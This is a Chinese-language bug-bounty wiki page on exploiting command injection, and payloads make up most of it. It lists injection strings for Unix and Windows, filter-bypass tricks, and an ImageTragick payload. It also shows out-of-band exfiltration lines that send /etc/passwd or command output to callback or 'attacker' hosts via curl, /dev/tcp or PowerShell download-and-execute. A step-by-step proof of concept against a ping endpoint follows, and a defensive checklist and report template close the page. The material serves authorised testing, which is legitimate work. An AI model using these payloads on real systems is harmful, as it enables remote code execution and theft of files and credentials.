---
type: wiki
category: attack
tool: commix,interactsh,manual
status: active
last-updated: 2026-04-21
---

# Command Injection 深度（2026 版）

> **用途：** Command injection 是 P1 RCE。常見在 `system()`、`exec()`、`popen()`、`shell_exec()`、`subprocess.call(shell=True)`、`child_process.exec`。本文把 Unix/Windows 語法、filter bypass、blind 偵測、完整 chain 都列出。

## 0. Sink 對照

| 語言 | Dangerous sink |
|------|----------------|
| PHP | `system()` `exec()` `shell_exec()` `passthru()` `popen()` `proc_open()` `` `` `` |
| Python | `os.system()` `os.popen()` `subprocess.call(shell=True)` `subprocess.run(shell=True)` `commands.getoutput()` |
| Node.js | `child_process.exec()` `child_process.execSync()` `vm.runInNewContext()` |
| Ruby | `` `` `` `system()` `%x[]` `open` `IO.popen` `eval` |
| Java | `Runtime.exec(cmd_string)` `ProcessBuilder(cmd_string)` with shell=true |
| Go | `exec.Command("sh","-c",cmd)` 而非 argv list |
| .NET | `Process.Start(cmd)` with shell=true / `/c cmd` |

關鍵：任何把**整個字串**丟 shell 的 API 都是潛在注入點。argv list（`exec("/bin/ls",["dir"])`）多半安全。

## 1. 找注入點

### 1.1 功能線索

```
DNS lookup / ping / traceroute                   → 99% 有
PDF / image 轉換（imagemagick/ghostscript）       → 高
SMS / email (送 wkhtmltopdf / curl)              → 中
備份 / 匯出                                       → 中
Log search (grep backend)                         → 中
Webhook 測試                                       → 高
ZIP / tar 解壓                                    → 高
檔名 / path 作參數                                 → 高
OCR / 字幕轉換                                     → 中
git clone / svn checkout 內部工具                 → 中
```

### 1.2 檢測 payload（safe → aggressive）

```bash
# Safe（只偵測，不執行）
?host=127.0.0.1     # baseline
?host=127.0.0.1;    # 部分 parser 吐 error
?host=127.0.0.1$(   # 類似
?host=127.0.0.1`    # 類似

# Sleep-based（blind）
?host=127.0.0.1;sleep+5
?host=127.0.0.1|sleep+5
?host=127.0.0.1%0asleep+5
?host=127.0.0.1&&sleep+5
?host=127.0.0.1%26%26sleep+5
?host=127.0.0.1$(sleep+5)
?host=127.0.0.1`sleep+5`
?host="$(sleep+5)"

# OOB (interactsh)
?host=127.0.0.1;curl+http://abc.oast.live/
?host=127.0.0.1||curl+http://abc.oast.live/
?host=127.0.0.1$(curl+http://abc.oast.live/)
```

## 2. Unix shell injection

### 2.1 分隔 metacharacter

```
;       # 串命令
&       # 背景執行 (尾端 &) / 分隔 (&&)
&&      # AND（前成功才執行後）
||      # OR（前失敗才執行後）
|       # pipe
`cmd`   # 命令代換
$(cmd)  # 命令代換
\n      # 換行等於 ;
\r\n    # Windows 風，也能觸發
```

### 2.2 空格被擋

```bash
# ${IFS} 替代
cat</etc/passwd
cat<>/etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd   # $9 = empty positional arg
```

### 2.3 關鍵字被擋

```bash
# cat 被擋
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
`echo Y2F0|base64 -d` /etc/passwd
$(which cat) /etc/passwd
/???/??t /etc/passwd          # glob
/bin/c?t /etc/passwd

# /etc/passwd 被擋
/???/p*wd
/e?c/p?sswd
```

### 2.4 重定向被擋

```bash
# > 被擋
tee /tmp/x <<< hello
printf hello | dd of=/tmp/x
```

### 2.5 Encoding bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
`printf '\143\141\164'` /etc/passwd     # 八進位 "cat"
$'\x63\x61\x74' /etc/passwd              # hex
```

## 3. Windows command injection

### 3.1 分隔

```cmd
&       同 Unix ;
&&      AND
||      OR
|       pipe
\r\n    換行
```

### 3.2 跳過 filter

```cmd
# 空格
tab character (%09)
%0a

# whoami 被擋
who^ami
who""ami
who^^ami

# 檔名
C:\Windows\System32\whoami.exe
dir C:\Users\*
type c:\windows\win.ini

# PowerShell encoded
powershell -enc <base64>
```

### 3.3 PowerShell 特有

```powershell
# 反射執行
$c='iex';& $c 'whoami'
$ExecutionContext.InvokeCommand.ExpandString('{0}(whoami)' -f '$')

# 下載執行
IEX(New-Object Net.WebClient).DownloadString('http://attacker/x.ps1')
```

## 4. Blind command injection 偵測

### 4.1 Time-based

```bash
?host=127.0.0.1;sleep+10
# 比 baseline 慢 10 秒 → 確認
```

### 4.2 DNS (OAST)

```bash
?host=127.0.0.1;curl+http://$(whoami).abc.oast.live/
# interactsh 看 DNS：root.abc.oast.live → user 是 root

# 或用 nslookup（某些系統沒 curl）
?host=127.0.0.1;nslookup+$(whoami).abc.oast.live
?host=127.0.0.1;wget+http://abc.oast.live/$(id|base64)
```

### 4.3 HTTP callback

```bash
?host=127.0.0.1;curl+-d+@/etc/passwd+http://abc.oast.live/
# POST body = /etc/passwd 內容 → interactsh 看 request body
```

### 4.4 若沒 curl / wget

```bash
# 用 /dev/tcp (bash-only)
?host=127.0.0.1;bash+-c+'cat</etc/passwd>/dev/tcp/attacker/4444'

# 純 python
?host=127.0.0.1;python+-c+'import+urllib.request;urllib.request.urlopen("http://oast/"+open("/etc/passwd").read())'
```

## 5. 非 shell sink

### 5.1 argv injection

當 server 呼叫 `exec("ping", [host])` 看起來安全，但若 `host="-c5;id"`，ping 把 `-c` 當 flag，拒絕但某些實作仍執行（見 [Axis parhand 案例](../../Bug Bounty Vault/09 - Knowledge Base/memory/project_axis_recon.md)）。

```bash
?host=-oProxyCommand=curl+attacker   # ssh 參數吃法
?host=--help                         # 確認 argv 到哪
?file=-I;id;                         # 部分工具把 - 開頭當 flag
```

### 5.2 imagemagick (GhostScript)

```bash
# 上傳 .gif / .png，內含惡意 coding
# CVE-2016-3714 (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/|id")'
pop graphic-context
```

見 [62-file-upload-exploitation.md](62-file-upload-exploitation.md)。

### 5.3 FFmpeg HLS

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

### 5.4 SSRF → 內網 cmd injection

見 [66-ssrf-deep.md](66-ssrf-deep.md)。

## 6. Filter bypass 實戰

### 6.1 常見 filter

```python
# 黑名單
blacklist = [';', '&', '|', '`', '$(']
for c in blacklist:
  cmd = cmd.replace(c,'')
```

繞法：

```
# 用 %0a (newline)
127.0.0.1%0aid

# %0d (CR)
127.0.0.1%0did

# Unicode ;
127.0.0.1%ef%bc%9bid    # 全形 ;

# Nested $(
$($(id))   # 雙層包含，replace 掉外層還留 $(

# 用 nested (
127.0.0.1\nid
```

### 6.2 「只擋 space」

```
cat</etc/passwd
{cat,/etc/passwd}
IFS=,;$(cat,/etc/passwd)
```

### 6.3 「白單：IP only」

```bash
# 字串長度 / regex IP check
127.0.0.1|id              # 被擋（不是 IP）

# 若 regex 是 substring match
127.0.0.1#$(id)           # URL 中 # 後被 browser 丟，server 看到原字串
127.0.0.1 id              # 若 regex 只 validate 前綴

# 若 regex 是 contains IP
127.0.0.1;echo+a127.0.0.1bid   # 後半仍 contains IP
```

## 7. 工具

### 7.1 Commix

```bash
git clone https://github.com/commixproject/commix
cd commix
python commix.py -u 'https://target.com/?host=FUZZ' --level=3

# POST
python commix.py -u 'https://target.com/api/ping' --data='host=1.1.1.1'

# Auto shell
python commix.py -u '...' --os-shell
```

### 7.2 Nuclei

```bash
nuclei -u https://target.com -tags rce,cmdinj -severity high,critical
```

### 7.3 Interactsh

```bash
interactsh-client -v
# 產出 abc123.oast.live，塞到 payload
```

### 7.4 Ffuf（bruteforce param）

```bash
ffuf -u 'https://target.com/FUZZ?host=127.0.0.1;sleep+5' \
  -w /path/to/endpoints.txt -fs 0 -t 10
```

## 8. 完整 PoC：Ping tool → RCE

### Step 1: 偵測

```bash
curl "https://target.com/api/ping?host=127.0.0.1"
# {"result":"PING 127.0.0.1 ... 64 bytes from 127.0.0.1"}

curl "https://target.com/api/ping?host=127.0.0.1;sleep+5"
# 5 秒後 → 200 → 命令注入存在
```

### Step 2: OOB 確認 user

```bash
# interactsh 起
interactsh-client -v  &
# 取 abc123.oast.live

curl -G "https://target.com/api/ping" \
  --data-urlencode 'host=127.0.0.1;curl+http://$(whoami).abc123.oast.live/'

# interactsh 看 DNS：www-data.abc123.oast.live → user 確認
```

### Step 3: 取 /etc/passwd

```bash
curl -G "https://target.com/api/ping" \
  --data-urlencode 'host=127.0.0.1;curl+-d+@/etc/passwd+http://abc123.oast.live/'

# interactsh HTTP body = /etc/passwd 內容
```

### Step 4: 停（不 reverse shell）

POC 止於驗證可讀 /etc/passwd 且可外連。不要 persist、不要真的 reverse shell。

### Step 5: 報告

```markdown
## 漏洞概述
https://target.com/api/ping?host= 未消毒 `;` 符號直接把使用者輸入拼進
`ping -c 1 $host` 的 shell command，達成 pre-auth RCE（user: www-data）。

## PoC
[3 curl + interactsh screenshot]

## Impact
- Pre-auth remote code execution
- 讀取任意檔案（/etc/passwd, app config, DB creds）
- 可作為內網 pivot 起點

## Severity
P1 / Critical

## 修補
1. 不要 string concat 進 shell，改用 argv list：
   subprocess.run(["ping","-c","1",host], shell=False)
2. Input validation：白單 IPv4/IPv6 regex
3. 禁用危險 shell 字元（;,&,|,`,$(）
4. 若真的需要 shell，用 shlex.quote(host) wrap
```

## 9. 防禦 checklist

```
1. 永遠用 argv list / parameterized API，禁止 string concat
   PHP: escapeshellarg() + escapeshellcmd()
   Python: subprocess.run([], shell=False)
   Node: execFile() 而非 exec()
   Java: ProcessBuilder(List<String>) 而非 Runtime.exec(String)
   Go: exec.Command(name, args...)
   .NET: ProcessStartInfo + Arguments list
2. 輸入白單（type + format + length）
3. 禁用危險 API（PHP disable_functions）
4. 應用最小權限（non-root user）
5. 容器 seccomp/AppArmor 限制 syscall
6. 出站防火牆（阻止 DNS/HTTP 外連）
7. 日誌監控：shell process spawn from web server user
```

## 關聯文件

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) — ImageMagick / Ghostscript cmdinj
- [66-ssrf-deep.md](66-ssrf-deep.md) — SSRF → 內網 API → cmdinj
- [67-deserialization.md](67-deserialization.md) — Deserialize → system()
- [73-ssti-deep.md](73-ssti-deep.md) — SSTI 達到 system()
- PortSwigger OS Command Injection：https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings CmdInj：https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- Commix：https://github.com/commixproject/commix
